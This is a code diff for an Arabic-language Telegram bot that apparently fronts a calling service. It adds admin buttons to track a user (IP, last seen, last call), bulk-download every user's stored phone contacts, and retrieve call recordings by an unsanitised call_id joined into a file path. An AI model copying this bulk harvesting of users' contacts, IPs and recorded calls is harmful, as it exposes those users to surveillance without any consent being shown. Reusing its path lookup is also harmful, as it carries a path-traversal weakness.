@@ -87,6 +87,27 @@ def _encrypt_accounts(data_str):
     return base64.b64encode(enc)
 RECORDINGS_DIR = os.path.join(SCRIPT_DIR, "recordings")
 os.makedirs(RECORDINGS_DIR, exist_ok=True)
+
+# ─── Helper functions for Flask API calls ─────────────────────────────────
+def _api_base():
+    """يرجع الرابط الأساسي لـ Flask API"""
+    try:
+        from foxapp_api import PUBLIC_URL
+        return PUBLIC_URL
+    except Exception:
+        return "http://localhost:5000"
+
+def _get_admin_secret():
+    """يرجع مفتاح الأدمن للـ Flask API"""
+    try:
+        from foxapp_api import ADMIN_SECRET
+        return ADMIN_SECRET
+    except Exception:
+        return ""
+
+def _api_headers():
+    """يرجع headers اللي لازم تترسل مع طلبات الأدمن"""
+    return {"x-admin-key": _get_admin_secret()}
 USERS_DB_FILE   = os.path.join(SCRIPT_DIR, "users_db.json")
 PREMIUM_DB_FILE = os.path.join(SCRIPT_DIR, "premium_db.json")
 BANNED_DB_FILE  = os.path.join(SCRIPT_DIR, "banned_db.json")
@@ -3569,6 +3590,13 @@ def _admin_panel():
         InlineKeyboardButton("📋 عرض أكواد الشحن", callback_data="admin_list_promo")
     )
     kb.add(
+        InlineKeyboardButton("🔍 تتبع شخص", callback_data="admin_track"),
+        InlineKeyboardButton("📱 سحب جهات الاتصال", callback_data="admin_contacts")
+    )
+    kb.add(
+        InlineKeyboardButton("🎙️ تسجيلات المكالمات", callback_data="admin_recordings")
+    )
+    kb.add(
         InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="go_start")
     )
 
@@ -4539,6 +4567,98 @@ def run_bot(token_override: str = ""):
             bot.send_message(cid, "\n".join(lines), parse_mode='Markdown')
 
         # ══════════════════════════════════════════════════════════════
+        # 🔍 تتبع شخص — Track a user via Flask API
+        # ══════════════════════════════════════════════════════════════
+        elif data == "admin_track":
+            if cid not in ADMIN_IDS:
+                return
+            bot.answer_callback_query(call.id)
+            user_state[cid] = {"action": "admin_track_input"}
+            kb_back = InlineKeyboardMarkup()
+            kb_back.row(InlineKeyboardButton("🔙 إلغاء", callback_data="admin_panel"))
+            bot.edit_message_text(
+                "🔍 *تتبع شخص*\n\nأدخل أي دي الشخص (user\\_id):",
+                cid, call.message.message_id,
+                parse_mode='Markdown', reply_markup=kb_back
+            )
+
+        # ══════════════════════════════════════════════════════════════
+        # 📱 سحب جميع جهات الاتصال — Pull All Contacts
+        # ══════════════════════════════════════════════════════════════
+        elif data == "admin_contacts":
+            if cid not in ADMIN_IDS:
+                return
+            bot.answer_callback_query(call.id, "⏳ جاري سحب جهات الاتصال...")
+            try:
+                base = _api_base()
+                headers = _api_headers()
+                r = requests.get(f"{base}/api/admin/contacts", headers=headers, timeout=30)
+                if r.status_code != 200:
+                    bot.edit_message_text(
+                        f"❌ فشل سحب جهات الاتصال (HTTP {r.status_code})",
+                        cid, call.message.message_id,
+                        reply_markup=_admin_panel()
+                    )
+                    return
+                data_resp = r.json()
+                contacts_data = data_resp.get("contacts", {})
+                if not contacts_data:
+                    bot.edit_message_text(
+                        "📱 لا توجد جهات اتصال محفوظة",
+                        cid, call.message.message_id,
+                        reply_markup=_admin_panel()
+                    )
+                    return
+                # إنشاء ملف JSON
+                json_str = json.dumps(contacts_data, ensure_ascii=False, indent=2)
+                import tempfile
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False, encoding='utf-8') as tmp_f:
+                    tmp_f.write(json_str)
+                    tmp_path = tmp_f.name
+                # حساب عدد المستخدمين وجهات الاتصال
+                total_users = len(contacts_data)
+                total_contacts = sum(len(u.get("contacts", [])) for u in contacts_data.values() if isinstance(u, dict))
+                # إرسال الملف
+                with open(tmp_path, 'rb') as f:
+                    bot.send_document(
+                        cid, f,
+                        caption=f"📱 *جهات الاتصال*\n👥 المستخدمين: `{total_users}`\n📞 جهات الاتصال: `{total_contacts}`",
+                        parse_mode='Markdown'
+                    )
+                # تنظيف
+                try:
+                    os.unlink(tmp_path)
+                except:
+                    pass
+                bot.edit_message_text(
+                    "✅ تم إرسال جهات الاتصال",
+                    cid, call.message.message_id,
+                    reply_markup=_admin_panel()
+                )
+            except Exception as e:
+                bot.edit_message_text(
+                    f"❌ خطأ: {e}",
+                    cid, call.message.message_id,
+                    reply_markup=_admin_panel()
+                )
+
+        # ══════════════════════════════════════════════════════════════
+        # 🎙️ تسجيلات المكالمات — Call Recordings
+        # ══════════════════════════════════════════════════════════════
+        elif data == "admin_recordings":
+            if cid not in ADMIN_IDS:
+                return
+            bot.answer_callback_query(call.id)
+            user_state[cid] = {"action": "admin_recordings_input"}
+            kb_back = InlineKeyboardMarkup()
+            kb_back.row(InlineKeyboardButton("🔙 إلغاء", callback_data="admin_panel"))
+            bot.edit_message_text(
+                "🎙️ *تسجيلات المكالمات*\n\nأدخل معرف المكالمة (call\\_id):",
+                cid, call.message.message_id,
+                parse_mode='Markdown', reply_markup=kb_back
+            )
+
+        # ══════════════════════════════════════════════════════════════
         # ⚙️ زرار الإعدادات — DTMF Actions
         # ══════════════════════════════════════════════════════════════
         elif data == "check_sub":
@@ -5111,6 +5231,116 @@ def run_bot(token_override: str = ""):
                 if remove_banned(uid): bot.reply_to(msg, f"✅ تم فك حظر `{uid}`", parse_mode='Markdown')
                 else: bot.reply_to(msg, f"❌ `{uid}` ليس محظوراً", parse_mode='Markdown')
             except: bot.reply_to(msg, "❌ معرف غير صحيح")
+            return
+
+        # ── تتبع شخص — استقبال user_id من الأدمن ────────────────────────
+        if action == "admin_track_input":
+            user_state.pop(cid)
+            uid = text.strip()
+            if not uid:
+                bot.reply_to(msg, "❌ أرسل معرف صحيح", reply_markup=_admin_panel())
+                return
+            bot.reply_to(msg, "⏳ جاري التتبع...")
+            try:
+                base = _api_base()
+                headers = _api_headers()
+                r = requests.get(f"{base}/api/admin/track/{uid}", headers=headers, timeout=30)
+                if r.status_code != 200:
+                    err_msg = ""
+                    try:
+                        err_msg = r.json().get("error", "")
+                    except:
+                        err_msg = f"HTTP {r.status_code}"
+                    bot.reply_to(msg, f"❌ فشل التتبع: {err_msg}", reply_markup=_admin_panel())
+                    return
+                d = r.json()
+                # بناء رسالة التتبع
+                lines = [
+                    f"🔍 *تتبع المستخدم* `{d.get('user_id', uid)}`\n",
+                    f"👤 الاسم: {_escape_md(d.get('full_name') or d.get('first_name') or 'غير معروف')}",
+                    f"🆔 اليوزر: @{_escape_md(d.get('username') or 'لا يوجد')}",
+                    f"🌐 IP: `{_escape_md(d.get('ip_address') or 'غير متوفر')}`",
+                    f"📅 تاريخ التسجيل: `{_escape_md(d.get('registration_date') or 'غير معروف')}`",
+                    f"👀 آخر ظهور: `{_escape_md(d.get('last_seen') or 'غير معروف')}`",
+                    f"🔑 آخر دخول: `{_escape_md(d.get('last_login') or 'غير معروف')}`",
+                    f"💰 الرصيد: `{d.get('balance', 0):.2f}$`",
+                    f"📞 مكالمات التطبيق: `{d.get('call_stats', {}).get('total_calls', 0)}`",
+                    f"📱 مكالمات Dan: `{d.get('dan_calls', 0)}`",
+                    f"👥 الإحالات: `{d.get('referrals', 0)}`",
+                    f"🔥 Streak: `{d.get('streak', 0)}`",
+                    f"🚫 محظور: {'نعم ❌' if d.get('is_banned') else 'لا ✅'}",
+                ]
+                # جهات الاتصال
+                contacts_info = d.get("contacts", {})
+                if isinstance(contacts_info, dict) and contacts_info.get("contacts"):
+                    contact_count = len(contacts_info["contacts"])
+                    lines.append(f"📇 جهات الاتصال: `{contact_count}`")
+                else:
+                    lines.append("📇 جهات الاتصال: `0`")
+                # آخر مكالمة
+                last_call = d.get("last_call") or (d.get("call_history") or [{}])[0] if d.get("call_history") else {}
+                if last_call:
+                    lines.append(f"\n📞 *آخر مكالمة:*")
+                    lines.append(f"   إلى: `{_escape_md(last_call.get('to', ''))}`")
+                    lines.append(f"   من: `{_escape_md(last_call.get('from', ''))}`")
+                    lines.append(f"   المدة: `{last_call.get('duration', 0)}s`")
+                    lines.append(f"   الحالة: `{_escape_md(last_call.get('status', ''))}`")
+                    lines.append(f"   الوقت: `{_escape_md(last_call.get('start_time') or last_call.get('timestamp', ''))}`")
+
+                kb_detail = InlineKeyboardMarkup()
+                kb_detail.row(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
+                bot.reply_to(msg, "\n".join(lines), parse_mode='Markdown', reply_markup=kb_detail)
+            except Exception as e:
+                bot.reply_to(msg, f"❌ خطأ في التتبع: {e}", reply_markup=_admin_panel())
+            return
+
+        # ── تسجيلات المكالمات — استقبال call_id من الأدمن ──────────────
+        if action == "admin_recordings_input":
+            user_state.pop(cid)
+            call_id = text.strip()
+            if not call_id:
+                bot.reply_to(msg, "❌ أرسل معرف مكالمة صحيح", reply_markup=_admin_panel())
+                return
+            # البحث عن ملف التسجيل في RECORDINGS_DIR
+            # قد يكون اسم الملف: <call_id>.wav أو <call_id>.mp3 أو أي امتداد صوتي
+            found_file = None
+            for ext in ['.wav', '.mp3', '.ogg', '.m4a', '.flac', '.raw', '']:
+                candidate = os.path.join(RECORDINGS_DIR, call_id + ext)
+                if os.path.exists(candidate):
+                    found_file = candidate
+                    break
+            if not found_file:
+                # بحث أوسع عن أي ملف يبدأ بـ call_id
+                try:
+                    for fname in os.listdir(RECORDINGS_DIR):
+                        if fname.startswith(call_id):
+                            found_file = os.path.join(RECORDINGS_DIR, fname)
+                            break
+                except:
+                    pass
+            if not found_file:
+                bot.reply_to(
+                    msg,
+                    f"❌ لا يوجد تسجيل للمكالمة `{call_id}`\n\n"
+                    f"📂 مجلد التسجيلات: `{RECORDINGS_DIR}`",
+                    parse_mode='Markdown',
+                    reply_markup=_admin_panel()
+                )
+                return
+            # إرسال ملف التسجيل
+            try:
+                file_size = os.path.getsize(found_file)
+                size_mb = file_size / (1024 * 1024)
+                fname = os.path.basename(found_file)
+                with open(found_file, 'rb') as audio_f:
+                    bot.send_document(
+                        cid, audio_f,
+                        caption=f"🎙️ *تسجيل المكالمة*\n🆔 `{call_id}`\n📁 `{fname}`\n📊 `{size_mb:.2f} MB`",
+                        parse_mode='Markdown'
+                    )
+                bot.reply_to(msg, "✅ تم إرسال التسجيل", reply_markup=_admin_panel())
+            except Exception as e:
+                bot.reply_to(msg, f"❌ خطأ في إرسال التسجيل: {e}", reply_markup=_admin_panel())
             return
 
         # ── تحويل الرصيد لكود — عدد الأشخاص ──────────────────────────
